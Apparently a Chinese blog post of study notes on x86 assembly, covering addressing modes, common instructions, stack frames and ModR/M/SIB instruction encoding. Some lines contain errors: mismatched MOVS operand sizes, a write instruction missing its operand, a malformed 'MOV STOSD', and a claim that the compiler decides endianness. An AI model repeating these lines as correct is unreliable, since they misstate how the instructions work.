<h4 id="2-内存地址"><a href="#2-内存地址" class="headerlink" title="2.内存地址"></a>2.内存地址</h4><p>(1)内存太大没法起名字，所以只能用编号。当我们想要向内存中存储数据，或者从内存读取数据时，必须用到这个编号。</p>
<p>(2)这个编号又称为内存地址（32位，前面0可以省略）[0x00000000]</p>
<h5 id="使用内存"><a href="#使用内存" class="headerlink" title="使用内存"></a>使用内存</h5><p><strong>1.存立即数到内存</strong></p>
<p>ptr ds:[   ]   里面写地址编号</p>
<p>地址和通用寄存器不一样，每个应用程序有4GB的内存，但是使用内存之前要先申请，不是可以随便用，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov byte ptr ds:[0xFFFFFFFF], 1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212210545890.png" alt="image-20231212210545890"></p>
<p>指令中的byte是数据大小，byte只有1字节，如果要写满数据，需要使用双字宽度dword，占4字节</p>
<p>使用word，可以存储2字节</p>
<p><strong>2.将寄存器中的值到内存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[0x012FB000], eax</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212215444670.png" alt="image-20231212215444670"></p>
<p><strong>3.将内存中的值存到寄存器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212221448664.png" alt="image-20231212221448664"></p>
<h4 id="3-内存地址的五种形式"><a href="#3-内存地址的五种形式" class="headerlink" title="3.内存地址的五种形式"></a>3.内存地址的五种形式</h4><h5 id="1-形式一：-立即数"><a href="#1-形式一：-立即数" class="headerlink" title="1.形式一：[立即数]"></a>1.形式一：[立即数]</h5><p>读取内存的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,dword pyr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<p>向内存中写入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<h5 id="2-形式二：-reg-reg-寄存器"><a href="#2-形式二：-reg-reg-寄存器" class="headerlink" title="2.形式二：[reg] reg &#x3D;&gt; 寄存器"></a>2.形式二：[reg] reg &#x3D;&gt; 寄存器</h5><p>reg代表寄存器，可以是8个通用寄存器中的任意一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[eax],ebx</span><br></pre></td></tr></table></figure>

<p>此处，EAX指向一个内存地址”0x012FFCF8”，EBX的值为FFFFFFFF</p>
<p><img src="/2023/12/10/compilation/image-20231212224535417.png" alt="image-20231212224535417"></p>
<h5 id="3-形式三：-reg-立即数"><a href="#3-形式三：-reg-立即数" class="headerlink" title="3.形式三：[reg+立即数]"></a>3.形式三：[reg+立即数]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[ecx+4],eax</span><br></pre></td></tr></table></figure>

<p>此处ECX指向内存地址DBB000，+4后，[ECX+4]指向DBB004，然后将EAX中的值传到DBB004内存地址</p>
<p><img src="/2023/12/10/compilation/image-20231212230144179.png" alt="image-20231212230144179"></p>
<h5 id="4-形式四：-reg-reg-1-2-4-8"><a href="#4-形式四：-reg-reg-1-2-4-8" class="headerlink" title="4.形式四：[reg + reg * {1,2,4,8} ]"></a>4.形式四：[reg + reg * {1,2,4,8} ]</h5><p>寄存器加寄存器乘1,2,4,8中的一个数，一般C语言中数组生成的汇编语言是这样的</p>
<p>读取内存的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x13FFc4</span><br><span class="line">mov ebx, 2</span><br><span class="line">mov edx, dword ptr ds:[eax+ebx*2]</span><br></pre></td></tr></table></figure>

<p>向内存中写入数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x137B000</span><br><span class="line">mov ecx, 2</span><br><span class="line">mov dword ptr ds:[eax+ecx*4], FFFF0001</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212232344040.png" alt="image-20231212232344040"></p>
<p><img src="/2023/12/10/compilation/image-20231212232757738.png" alt="image-20231212232757738"></p>
<h5 id="5-形式五：-reg-reg-1-2-4-8-立即数"><a href="#5-形式五：-reg-reg-1-2-4-8-立即数" class="headerlink" title="5.形式五：[reg + reg * {1,2,4,8} + 立即数 ]"></a>5.形式五：[reg + reg * {1,2,4,8} + 立即数 ]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x13FFc4</span><br><span class="line">mov ebx, 2</span><br><span class="line">mov edx, dword ptr ds:[eax+ebx*2+4]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x137B000</span><br><span class="line">mov ecx, 2</span><br><span class="line">mov dword ptr ds:[eax+ecx*4+4], FFFF0001</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231213141111995.png" alt="image-20231213141111995"></p>
<h3 id="6-数据的存储模式"><a href="#6-数据的存储模式" class="headerlink" title="6.数据的存储模式"></a>6.数据的存储模式</h3><p>1.大端模式：数据高位在低位，数据低位在高位</p>
<p>2.小端模式：数据低位在低位，数据高位在高位</p>
<p><img src="/2023/12/10/compilation/image-20231213142908404.png" alt="image-20231213142908404"></p>
<p>大端模式：1A	0x00000000</p>
<p>​				  2C	0x00000001</p>
<p><img src="/2023/12/10/compilation/image-20231213143809023.png" alt="image-20231213143809023"></p>
<p><img src="/2023/12/10/compilation/image-20231213143923697.png" alt="image-20231213143923697"></p>
<p>大端存储或小端存储受编译器影响，可以改成大端或小端</p>
<h3 id="7-常用的汇编指令"><a href="#7-常用的汇编指令" class="headerlink" title="7.常用的汇编指令"></a>7.常用的汇编指令</h3><h4 id="1-MOV指令"><a href="#1-MOV指令" class="headerlink" title="1.MOV指令"></a>1.MOV指令</h4><p>指令格式：<br>1、MOV r&#x2F;m8,r8<br>2、MOV r&#x2F;m16,r16	将寄存器的值存到寄存器或内存<br>3、MOV r&#x2F;m32,r32<br>4、MOV r8,r&#x2F;m8<br>5、MOV r16,r&#x2F;m16<br>6、MOV r32,r&#x2F;m32<br>7、MOV r8,imm8<br>8、MOV r16,imm16<br>9、MOV r32,imm32</p>
<p>r代表通用寄存器，r8代表8位寄存器<br>m代表内存，m8代表8位内存<br>imm代表立即数，imm8代表8位立即数</p>
<h4 id="2-ADD指令（加法指令）"><a href="#2-ADD指令（加法指令）" class="headerlink" title="2.ADD指令（加法指令）"></a>2.ADD指令（加法指令）</h4><p>ADD r&#x2F;m8,imm8<br>ADD r&#x2F;m16,imm16<br>ADD r&#x2F;m32,imm32<br>ADD r&#x2F;m16,imm8<br>ADD r&#x2F;m32,imm8<br>ADD r&#x2F;m8,r8<br>ADD r&#x2F;m16,r16<br>ADD r&#x2F;m32,r32<br>ADD r8,r&#x2F;m8<br>ADD r16,r&#x2F;m16<br>ADD r32,r&#x2F;m32</p>
<h4 id="3-SUB指令（减法指令）"><a href="#3-SUB指令（减法指令）" class="headerlink" title="3.SUB指令（减法指令）"></a>3.SUB指令（减法指令）</h4><p>SUB r&#x2F;m8,imm8<br>SUB r&#x2F;m16,imm16<br>SUB r&#x2F;m32,imm32<br>SUB r&#x2F;m16,imm8<br>SUB r&#x2F;m32,imm8<br>SUB r&#x2F;m8,r8<br>SUB r&#x2F;m16,r16<br>SUB r&#x2F;m32,r32<br>SUB r8,r&#x2F;m8<br>SUB r16,r&#x2F;m16<br>SUB r32,r&#x2F;m32</p>
<h4 id="4-AND指令（与运算）"><a href="#4-AND指令（与运算）" class="headerlink" title="4.AND指令（与运算）"></a>4.AND指令（与运算）</h4><p>AND r&#x2F;m8,imm8<br>AND r&#x2F;m16,imm16<br>AND r&#x2F;m32.imm32<br>AND r&#x2F;m16,imm8<br>AND r&#x2F;m32.imm8<br>AND r&#x2F;m8,r8<br>AND r&#x2F;m16,r16<br>AND r&#x2F;m32.,r32<br>AND r8,r&#x2F;m8<br>AND r16,r&#x2F;m16<br>AND r32,r&#x2F;m32</p>
<h4 id="5-XOR指令（异或运算）"><a href="#5-XOR指令（异或运算）" class="headerlink" title="5.XOR指令（异或运算）"></a>5.XOR指令（异或运算）</h4><p>XOR r&#x2F;m8,imm8<br>XOR r&#x2F;m16,imm16<br>XOR r&#x2F;m32.imm32<br>XOR r&#x2F;m16,imm8<br>XOR r&#x2F;m32,imm8<br>XOR r&#x2F;m8,r8<br>XOR r&#x2F;m16,r16<br>XOR r&#x2F;m32,r32<br>XOR r8,r&#x2F;m8<br>XOR r16.r&#x2F;m16<br>XOR r32,r&#x2F;m32</p>
<h4 id="6-NOT指令（非运算）"><a href="#6-NOT指令（非运算）" class="headerlink" title="6.NOT指令（非运算）"></a>6.NOT指令（非运算）</h4><p>NOT r&#x2F;m8<br>NOT r&#x2F;m16<br>NOT r&#x2F;m32</p>
<h4 id="7-MOVS指令-移动数据从内存到内存"><a href="#7-MOVS指令-移动数据从内存到内存" class="headerlink" title="7.MOVS指令 移动数据从内存到内存"></a>7.MOVS指令 移动数据从内存到内存</h4><p>MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSB<br>MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSW<br>MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSD</p>
<p>ESI存储的是一个地址，是一个内存编号，就是要复制的数据在哪里</p>
<p>EDI存储的是一个地址，是要把数据复制到哪里去</p>
<p><strong>标志寄存器 EFL</strong></p>
<p>00000204</p>
<img src="/2023/12/10/compilation/image-20231213214453116.png" alt="image-20231213214453116" style="zoom: 67%;">

<p>第十位为DF位，当DF位为0时，使用MOVS等指令，MOVS完之后，地址会自动递增（从低地址向高地址处理串）</p>
<p>​						当DF位为1时，使用MOVS等指令，MOVS完之后，地址会自动递减（从高地址向低地址处理串）</p>
<img src="/2023/12/10/compilation/20231213215254-1702475722564-2.png" alt="20231213215254" style="zoom:150%;">

<p>地址自动递增（递减）时，移动的长度取决于移动了一个字节、两个字节还是四个字节。</p>
<h4 id="8-STOS指令"><a href="#8-STOS指令" class="headerlink" title="8.STOS指令"></a>8.STOS指令</h4><p>将<strong>al&#x2F;ax&#x2F;eax</strong>的值存储到[EDI]指定的内存单元</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STOS BYTE PTR ES:[EDI]	每次存一个字节</span><br><span class="line">STOS WORD PTR ES:[EDI]	每次存两个字节</span><br><span class="line">STOS DWORD PTR ES:[EDI]	每次存四个字节</span><br></pre></td></tr></table></figure>

<h4 id="9-REP指令"><a href="#9-REP指令" class="headerlink" title="9.REP指令"></a>9.REP指令</h4><p>按照计数寄存器（ECX）中指定的次数重复执行字符串指令</p>
<p>计数寄存器是ECX，不是别的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">REP MOVSD</span><br><span class="line"></span><br><span class="line">MOV STOSD</span><br></pre></td></tr></table></figure>

<p>首先在ECX中存一个数，这个数是十六进制的，如果ECX中存10，则执行16次，每执行一次减一</p>
<h3 id="8-堆栈相关的指令"><a href="#8-堆栈相关的指令" class="headerlink" title="8.堆栈相关的指令"></a>8.堆栈相关的指令</h3><h4 id="1-堆栈"><a href="#1-堆栈" class="headerlink" title="1.堆栈"></a>1.堆栈</h4><p>1）就是一块内存，操作系统在程序启动时已经分配好的，供程序执行时使用。<br>2）和数据结构的堆栈无关<br>3）查看堆栈</p>
<h3 id="2-ESP寄存器（栈指针寄存器）"><a href="#2-ESP寄存器（栈指针寄存器）" class="headerlink" title="2.ESP寄存器（栈指针寄存器）"></a>2.ESP寄存器（栈指针寄存器）</h3><h3 id="3-PUSH指令"><a href="#3-PUSH指令" class="headerlink" title="3.PUSH指令"></a>3.PUSH指令</h3><p>功能： &lt; 1 &gt; 向堆栈中压入数据<br>            &lt; 2 &gt;修改栈顶指针ESP寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231214001525192.png" alt="image-20231214001525192"></p>
<p>执行PUSH指令后：</p>
<p><img src="/2023/12/10/compilation/image-20231214001641026.png" alt="image-20231214001641026"></p>
<p>4被存储在了0x0053FF14中，并且ESP指向了当前的地址，因此PUSH指令是将MOV DWORD PTR DS:[]指令和SUB ESP,0x4简化了</p>
<p>除了PUSH立即数，还能PUSH寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231214002210231.png" alt="image-20231214002210231"></p>
<h3 id="9-EIP寄存器"><a href="#9-EIP寄存器" class="headerlink" title="9.EIP寄存器"></a>9.EIP寄存器</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>EIP寄存器不能使用MOV进行修改</p>
<p>使用JMP指令修改EIP寄存器，EIP寄存器存储的是CPU下一次要执行的地址</p>
<p><img src="/2023/12/10/compilation/image-20231214150746795.png" alt="image-20231214150746795"></p>
<p>JUM指令可以跟立即数，也可以跟其他寄存器或内存</p>
<h4 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h4><p>1.将CALL后面的值存到EIP里<br>2.将CALL的下一行地址存到了堆栈中<br>3.ESP中的地址减0x4</p>
<p><img src="/2023/12/10/compilation/image-20231214155227379.png" alt="image-20231214155227379"></p>
<p><img src="/2023/12/10/compilation/image-20231214155540532.png" alt="image-20231214155540532"></p>
<h4 id="RET（return）"><a href="#RET（return）" class="headerlink" title="RET（return）"></a>RET（return）</h4><p>1.将当前栈顶指针ESP的值放到EIP里<br>2.将ESP加0x4</p>
<p>相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD ESP,4</span><br><span class="line">MOV EIP, [ESP-4]</span><br></pre></td></tr></table></figure>

<h3 id="10-函数"><a href="#10-函数" class="headerlink" title="10.函数"></a>10.函数</h3><h4 id="1-函数的执行与调用"><a href="#1-函数的执行与调用" class="headerlink" title="1.函数的执行与调用"></a>1.函数的执行与调用</h4><p><strong>调用函数时一般使用CALL指令：</strong>因为通过CALL指令，会把CALL的下一行地址压到堆栈中，此时执行完函数之后只需要使用RET指令，即可返回到CALL指令的下一行</p>
<p><img src="/2023/12/10/compilation/image-20231214200005208.png" alt="image-20231214200005208"></p>
<p>执行函数后：</p>
<p><img src="/2023/12/10/compilation/image-20231214200601922.png" alt="image-20231214200601922"></p>
<p><strong>在调用函数传参时，如果有10个参数怎么办，</strong>如果使用通用寄存器只有8个，则使用<strong>堆栈传参</strong></p>
<p>用过PUSH指令，向堆栈中压入参数，需要调用的时候，在函数中使用ESP寻找参数</p>
<p><img src="/2023/12/10/compilation/image-20231214203450368.png" alt="image-20231214203450368"></p>
<p><img src="/2023/12/10/compilation/image-20231214204753323.png" alt="image-20231214204753323"></p>
<p>因为CALL函数后，ESP会-4操作并寄存CALL的下一行的地址，所以使用ADD EAX, DWORD PTR DS:[ESP+立即数] 即可找到之前PUSH的参数</p>
<h4 id="2-堆栈平衡"><a href="#2-堆栈平衡" class="headerlink" title="2.堆栈平衡"></a>2.堆栈平衡</h4><p>在函数调用的时候，执行完CALL指令，会将下一行地址压入堆栈，此时进入了函数体，当函数在执行时，可能会PUSH一些值到堆栈中，此时ESP指向的地址就不是CALL的下一行地址，如果此时使用了RET指令，那么返回的地址错误，程序就会出错，也就是堆栈不平衡。</p>
<p>所以在函数执行完毕执行RET指令时，要保证ESP指向的地址是之前CALL指令执行后的下一行地址。</p>
<p><img src="/2023/12/10/compilation/image-20231214210900748.png" alt="image-20231214210900748"></p>
<h3 id="11-寻址"><a href="#11-寻址" class="headerlink" title="11.寻址"></a>11.寻址</h3><h4 id="1-ESP寻址"><a href="#1-ESP寻址" class="headerlink" title="1.ESP寻址"></a>1.ESP寻址</h4><p>当使用ESP寻址之前在函数体中又向堆栈中PUSH了值，就会使ESP寻址更加困难，而且在堆栈中暂存寄存器的值还需要POP，所以使用ESP寻址较繁琐。</p>
<p><img src="/2023/12/10/compilation/image-20231215160655838.png" alt="image-20231215160655838"></p>
<p><img src="/2023/12/10/compilation/image-20231215164449175.png" alt="image-20231215164449175"></p>
<h4 id="2-EBP寻址"><a href="#2-EBP寻址" class="headerlink" title="2.EBP寻址"></a>2.EBP寻址</h4><p>先将EBP保存起来，然后让EBP指向ESP的位置，将现在的ESP提升一块，也就划分出了一块新的堆栈，供当前程序(函数)使用。</p>
<p>当CALL函数时，继续向堆栈中压入数据，ESP会上下浮动，但是不会影响从EBP到ESP提升后的位置。从EBP到ESP提升的这一段空间就可以放置参数，那么参数就可以使用EBP来寻址。</p>
<h5 id="1-保存EBP"><a href="#1-保存EBP" class="headerlink" title="1.保存EBP"></a>1.保存EBP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call 0x000000AA</span><br><span class="line"></span><br><span class="line">000000AA:  PUSH EBP // 将EBP之前的值存储起来</span><br></pre></td></tr></table></figure>

<p>此时，堆栈就会变成这样</p>
<img src="/2023/12/10/compilation/image-20231215162924185.png" alt="image-20231215162924185" style="zoom:67%;">

<h5 id="2-将EBP提升到ESP"><a href="#2-将EBP提升到ESP" class="headerlink" title="2.将EBP提升到ESP"></a>2.将EBP提升到ESP</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>

<p>此时堆栈和栈指针变成这样：</p>
<img src="/2023/12/10/compilation/image-20231215163246352.png" alt="image-20231215163246352" style="zoom:67%;">

<h5 id="3-提升ESP栈顶指针"><a href="#3-提升ESP栈顶指针" class="headerlink" title="3.提升ESP栈顶指针"></a>3.提升ESP栈顶指针</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp 4*0x4</span><br></pre></td></tr></table></figure>

<p>使用sub就是将ESP指针向上移，使EBP向上到ESP腾出了一部分空间</p>
<p><img src="/2023/12/10/compilation/image-20231215164021815.png" alt="image-20231215164021815" style="zoom:67%;"><img src="/2023/12/10/compilation/image-20231215164146109.png" alt="image-20231215164146109"></p>
<h5 id="4-使用内存"><a href="#4-使用内存" class="headerlink" title="4.使用内存"></a>4.使用内存</h5><p>可以使用EBP栈指针寻找参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax dword ptr ss:[ebp+0xC]</span><br></pre></td></tr></table></figure>

<h5 id="5-恢复内存"><a href="#5-恢复内存" class="headerlink" title="5.恢复内存"></a>5.恢复内存</h5><p>将ESP返回到EBP的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ESP, EBP</span><br></pre></td></tr></table></figure>

<img src="/2023/12/10/compilation/image-20231215163246352.png" alt="image-20231215163246352" style="zoom:67%;">

<p>此时EBP不用了，就把EBP取回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure>

<p>弹出后EBP后ESP会指向之前存EBP的内存地址</p>
<p>此时堆栈就恢复到了EBP寻址前的样子</p>
<h5 id="6-RET-立即数"><a href="#6-RET-立即数" class="headerlink" title="6.RET 立即数"></a>6.RET 立即数</h5><p>因为CALL之前压入了参数，所以用RET 立即数  进行堆栈平衡</p>
<p><strong>EBP寻址总过程：</strong></p>
<p><img src="/2023/12/10/compilation/image-20231215171758535.png" alt="image-20231215171758535"></p>
<h3 id="12-JCC"><a href="#12-JCC" class="headerlink" title="12.JCC"></a>12.JCC</h3><h4 id="1-标志寄存器EFLAGS"><a href="#1-标志寄存器EFLAGS" class="headerlink" title="1.标志寄存器EFLAGS"></a>1.标志寄存器EFLAGS</h4><p> <img src="/2023/12/10/compilation/image-20231215205900615.png" alt="image-20231215205900615"></p>
<h3 id="13-硬编码"><a href="#13-硬编码" class="headerlink" title="13.硬编码"></a>13.硬编码</h3><h4 id="1-指令编码（硬编码）的结构"><a href="#1-指令编码（硬编码）的结构" class="headerlink" title="1.指令编码（硬编码）的结构"></a>1.指令编码（硬编码）的结构</h4><p><img src="/2023/12/10/compilation/image-20231216230528497.png" alt="image-20231216230528497"> </p>
<h4 id="2-反汇编引擎（x32dbg-DTDebug"><a href="#2-反汇编引擎（x32dbg-DTDebug" class="headerlink" title="2.反汇编引擎（x32dbg , DTDebug"></a>2.反汇编引擎（x32dbg , DTDebug</h4><p>将硬编码转换成汇编语言，或将汇编语言转换成硬编码</p>
<p><img src="/2023/12/10/compilation/image-20231216231259394.png" alt="image-20231216231259394"></p>
<h4 id="3-前缀指令"><a href="#3-前缀指令" class="headerlink" title="3.前缀指令"></a>3.前缀指令</h4><img src="/2023/12/10/compilation/image-20231218140943554.png" alt="image-20231218140943554" style="zoom:50%;">

<p>看上面的结构图，最后面有一个(optional)，说明指令前缀是可选的。CPU判断一个指令是前缀还是OPcode，通过值来判断。</p>
<p>反汇编引擎会在前缀指令后面加一个冒号来区分。但是，实际上在exe中并没有这个冒号</p>
<p><img src="/2023/12/10/compilation/image-20231218141423898.png" alt="image-20231218141423898"></p>
<p>前缀指令是分组的，前缀指令最多四个，每组最多一个</p>
<img src="/2023/12/10/compilation/image-20231218141946019.png" alt="image-20231218141946019" style="zoom:50%;">

<h5 id="（1）LOCK和REPEAT前缀指令"><a href="#（1）LOCK和REPEAT前缀指令" class="headerlink" title="（1）LOCK和REPEAT前缀指令"></a>（1）LOCK和REPEAT前缀指令</h5><p><strong>LOCK</strong>					F0，用来锁地址总线，如果在一个地址上加上LOCK，如果在同一时刻有多个CPU核执行这条指令，只能有一个核可以读取这个地址，其他核不能读取这个地址。这条指令在多核下才有用，单核没有什么作用</p>
<p><strong>REPNE&#x2F;REPNZ</strong>	F2<br>                                   这两个指令，当EFLAGS寄存器的ZF位为0的时候执行上面的ZF位为1时执行下面的<br><strong>REP&#x2F;REPZ</strong>			F3</p>
<h5 id="（2）段（段寄存器）前缀指令-操作系统、内核程序"><a href="#（2）段（段寄存器）前缀指令-操作系统、内核程序" class="headerlink" title="（2）段（段寄存器）前缀指令  &#x3D;&gt; 操作系统、内核程序"></a>（2）段（段寄存器）前缀指令  &#x3D;&gt; 操作系统、内核程序</h5><p>CS(2E)、SS(36)、DS(3E)、ES(26)、FS(64)、GS(65)</p>
<p>如果不指定哪个段寄存器，则使用DS段寄存器；当寻址时出现了EBP、ESP时，默认使用的段寄存器是SS段寄存器</p>
<p>段寄存器就是指定寻址时，使用的段寄存器是谁</p>
<p>比如，当加上了前缀指令65，那么后面就会使用GS段寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218143744957.png" alt="image-20231218143744957"></p>
<h5 id="操作数宽度前缀指令-66"><a href="#操作数宽度前缀指令-66" class="headerlink" title="操作数宽度前缀指令 66"></a>操作数宽度前缀指令 66</h5><p>66</p>
<p>比如，当硬编码55 PUSH EBP 时，默认的是32位的EBP寄存器，如果想用16位的BP寄存器，则在前面加上前缀指令 66，用来改变操作数宽度。而如果当前CPU默认处于16位状态下，如果加上66前缀，那么操作数就会变成32位的EBP寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218145121846.png" alt="image-20231218145121846"></p>
<h5 id="地址宽度前缀指令-67"><a href="#地址宽度前缀指令-67" class="headerlink" title="地址宽度前缀指令 67"></a>地址宽度前缀指令 67</h5><p>当当前的寻址方式是32位的，当加上地址宽度前缀时，32位的寻址方式会变成16位寻址方式</p>
<p><img src="/2023/12/10/compilation/image-20231218151101155.png" alt="image-20231218151101155"></p>
<p><strong>总结：</strong>前缀指令最多四个，每组一个，一行指令可以添加多个前缀指令，前缀指令的顺序没有要求。</p>
<h4 id="4-定长指令与变长指令"><a href="#4-定长指令与变长指令" class="headerlink" title="4.定长指令与变长指令"></a>4.定长指令与变长指令</h4><p>Opcode：在硬编码结构中，其他的结构可以没有，但是opcode必须要有，opcode 可以是1byte 2byte 3byte<br>Opcode是一条指令中最重要的组成部分，后面的ModR&#x2F;M有没有由Opcode决定，SIB有没有由ModR&#x2F;M决定。</p>
<p>定长指令：当Opcode确定了，指令长度就确定了</p>
<p>变长指令：仅仅通过Opcode是无法确定长度的</p>
<h5 id="定长指令"><a href="#定长指令" class="headerlink" title="定长指令"></a>定长指令</h5><p><strong>经典定长指令：修改ERX（通用寄存器）</strong></p>
<p>1.PUSH&#x2F;POP  50<del>57,58</del>5F</p>
<img src="/2023/12/10/compilation/image-20231218193139403.png" alt="image-20231218193139403" style="zoom:67%;">

<p>2.INC&#x2F;DEC  40<del>47,48</del>4F</p>
<p>INC加一，DEC减一</p>
<img src="/2023/12/10/compilation/image-20231218193607613.png" alt="image-20231218193607613" style="zoom: 67%;">

<p>3.mov 寄存器, 立即数</p>
<img src="/2023/12/10/compilation/image-20231218195643211.png" alt="image-20231218195643211" style="zoom:67%;">

<p>4.XCHG 两个寄存器的值交换</p>
<img src="/2023/12/10/compilation/image-20231218201054537.png" alt="image-20231218201054537" style="zoom:67%;">

<p><strong>经典定长指令：修改EIP（CPU执行地址）</strong></p>
<p><img src="/2023/12/10/compilation/image-20231218205916589.png" alt="image-20231218205916589"></p>
<p><img src="/2023/12/10/compilation/image-20231218205936389.png" alt="image-20231218205936389"></p>
<p><img src="/2023/12/10/compilation/image-20231218210027620.png" alt="image-20231218210027620"></p>
<p><img src="/2023/12/10/compilation/image-20231218211305524.png" alt="image-20231218211305524"></p>
<h5 id="变长指令"><a href="#变长指令" class="headerlink" title="变长指令"></a>变长指令</h5><p>当opcode 后面有ModR&#x2F;M结构时，就是变长指令<br>重要的变长指令</p>
<p><img src="/2023/12/10/compilation/image-20231218220233910.png" alt="image-20231218220233910"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x88  MOV Eb, Gb</span><br><span class="line">0x89  MOV Ev, Gv</span><br><span class="line">0x8A  MOV Gb, Eb</span><br><span class="line">0x8B  MOV Gv, Ev</span><br><span class="line"></span><br><span class="line">G:通用寄存器 E:寄存器/内存</span><br><span class="line">b:字节	  v:Word, doubleword or quaword</span><br></pre></td></tr></table></figure>


<p>ModR&#x2F;M占一个字节，该字节的8个位被分成了三部分使用</p>
<p><img src="/2023/12/10/compilation/image-20231218220029004.png" alt="image-20231218220029004"></p>
<p>Mod(6,7位)和R&#x2F;M(0、1、2位) 共同描述指令中的E部分即寄存器或内存</p>
<p><img src="/2023/12/10/compilation/image-20231218222947497.png" alt="image-20231218222947497"></p>
<p>ModR&#x2F;M中间部分第3、4、5位，用来描述Reg&#x2F;Opcode也就是指令中的G部分，即寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231218220731549.png" alt="image-20231218220731549"></p>
<p>比如一个硬编码 <strong>88 01</strong></p>
<p>88：MOV Eb, Gb</p>
<p>01：00 000 001 第3、4、5位是000，查表能得到EAX&#x2F;AL。因为G后面跟的b，所以是8位的AL。		现在的指令就是MOV Eb, AL</p>
<p>再查表，Mod：00，R&#x2F;M：001，对应的寄存器是ECX						所以，指令就变成了	<strong>MOV BYTE PTR DS:[ECX], AL</strong></p>
<h5 id="ModR-M结构"><a href="#ModR-M结构" class="headerlink" title="ModR&#x2F;M结构"></a>ModR&#x2F;M结构</h5><p><img src="/2023/12/10/compilation/image-20231218223845586.png" alt="image-20231218223845586"></p>
<p>1.Mod与R&#x2F;M共同描述E的意义（内存或者通用寄存器）</p>
<p>2、Reg&#x2F;Opcode描述了G的意义（通用寄存器）。但3-5字段，并不仅仅用来标识寄存器，有些时候，用来标识Opcode。</p>
<p>拆一个编码 80 65</p>
<p>65：   01   					100 					  101<br>       Mod:01		Reg&#x2F;Opencode			R&#x2F;M:101</p>
<p>根据Mod R&#x2F;M查出byte ptr ds:[ebp+dis8], Ib</p>
<p>当查表时看到Grp，就要去查Table A-6</p>
<p><img src="/2023/12/10/compilation/image-20231218231619393.png" alt="image-20231218231619393"></p>
<p>Table A-6：</p>
<p><img src="/2023/12/10/compilation/image-20231218235421168.png" alt="image-20231218235421168"></p>
<p>查表A-2能得到100对应的是AND指令，所以，80 65对应的汇编就是AND byte ptr ds:[ebp+dis8], Ib</p>
<p>但是发现这条指令里面还有一个8位的地址偏移DIS8，一个立即数Ib，所以后面还应该有两个值。</p>
<p><img src="/2023/12/10/compilation/image-20231219140855744.png" alt="image-20231219140855744"></p>
<h5 id="定长指令-SIB"><a href="#定长指令-SIB" class="headerlink" title="定长指令 SIB"></a>定长指令 SIB</h5><img src="/2023/12/10/compilation/image-20231219141132169.png" alt="image-20231219141132169" style="zoom:67%;">

<p>如一个指令 88 84 48</p>
<p>通过查表，88是MOV Eb, Gb		那么84就是ModR&#x2F;M。10      000       100<br>                                                                                        Mod     Reg      R&#x2F;M</p>
<p>Reg：AL		查表得Mod为00，01，10时，R&#x2F;M对应的是 [ – ] [ – ] 或 [ – ] [ – ] +disp8 或 [ – ] [ – ] +disp32</p>
<p>那么这里的[ – ] [ – ]就是由SIB决定的，因此48就是SIB。</p>
<p><strong>SIB的指令结构：</strong><br><img src="/2023/12/10/compilation/image-20231219142642622.png" alt="image-20231219142642622"></p>
<p><img src="/2023/12/10/compilation/image-20231219142743116.png" alt="image-20231219142743116"></p>
<p>48： 01         001       000			&#x3D;&gt; 	<strong>查Table2-3</strong><br>       scale	 index	 base</p>
<p><img src="/2023/12/10/compilation/image-20231219143038753.png" alt="image-20231219143038753"></p>
<p><img src="/2023/12/10/compilation/image-20231219143145855.png" alt="image-20231219143145855"></p>
<p>查base是000，所以是[EAX]</p>
<p>再找scale 和 index ，是[ECX * 2]</p>
<img src="/2023/12/10/compilation/image-20231219143700233.png" alt="image-20231219143700233" style="zoom:50%;">

